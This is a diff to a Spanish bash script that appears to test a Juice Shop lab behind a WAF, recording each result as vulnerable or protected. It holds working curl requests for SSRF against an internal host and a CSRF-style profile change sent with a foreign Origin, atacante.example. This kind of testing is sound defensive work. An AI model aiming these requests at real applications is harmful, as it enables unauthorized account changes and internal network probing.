@@ -64,17 +64,17 @@ fi
 
 # T5 SSRF: la app descarga la imagen de perfil desde una URL interna (marca única en el log del WAF)
 MARCA_SSRF="ssrf-sonda-$TS"
-h=$(c -X POST "$B/profile/image/url" -H "Cookie: token=$TA" -H 'Content-Type: application/x-www-form-urlencoded' --data "imageUrl=http://juice-waf:8080/$MARCA_SSRF.png")
+h=$(c -X POST "$B/profile/image/url" -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" -H 'Content-Type: application/x-www-form-urlencoded' --data "imageUrl=http://juice-waf:8080/$MARCA_SSRF.png")
 fila T5 "SSRF hacia un servicio interno" "POST /profile/image/url imageUrl=http://juice-waf:8080/…" "$h" "ver marca $MARCA_SSRF en el log de acceso del WAF (lo comprueba el ejecutor)" "PENDIENTE DE LOG"
 
 # T6 CSRF: cambio del nombre de usuario con la cookie y un Origin ajeno (como haría un formulario de otro sitio)
 # (whoami no devuelve el nombre de usuario: se lee el usuario por la API con el token de A)
-UIDA=$(curl -s --max-time 20 -H "Cookie: token=$TA" "$B/rest/user/whoami" | grep -oE '"id":[0-9]+' | head -1 | cut -d: -f2)
+UIDA=$(curl -s --max-time 20 -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" "$B/rest/user/whoami" | grep -oE '"id":[0-9]+' | head -1 | cut -d: -f2)
 nombre() { curl -s --max-time 20 -H "Authorization: Bearer $TA" "$B/api/Users/${UIDA:-0}" | grep -oE '"username":"[^"]*"' | cut -d'"' -f4; }
-h=$(c -X POST "$B/profile" -H "Cookie: token=$TA" -H 'Origin: https://atacante.example' -H 'Content-Type: application/x-www-form-urlencoded' --data "username=csrf$TS")
+h=$(c -X POST "$B/profile" -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" -H 'Origin: https://atacante.example' -H 'Content-Type: application/x-www-form-urlencoded' --data "username=csrf$TS")
 u=$(nombre | grep -c "csrf$TS")
 fila T6 "CSRF: perfil con Origin ajeno" "POST /profile (cookie, Origin: https://atacante.example)" "$h" "nombre cambiado: $([ "$u" -gt 0 ] && echo sí || echo no)" "$([ "$u" -gt 0 ] && echo VULNERABLE || echo PROTEGIDO)"
-h=$(c -X POST "$B/profile" -H "Cookie: token=$TA" -H 'Content-Type: application/x-www-form-urlencoded' --data "username=legit$TS")
+h=$(c -X POST "$B/profile" -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" -H 'Content-Type: application/x-www-form-urlencoded' --data "username=legit$TS")
 u=$(nombre | grep -c "legit$TS")
 fila T6b "Control: perfil sin Origin ajeno (uso legítimo)" "POST /profile (cookie)" "$h" "nombre cambiado: $([ "$u" -gt 0 ] && echo sí || echo no)" "$([ "$u" -gt 0 ] && echo PROTEGIDO || echo 'NO CONCLUYENTE')"
 
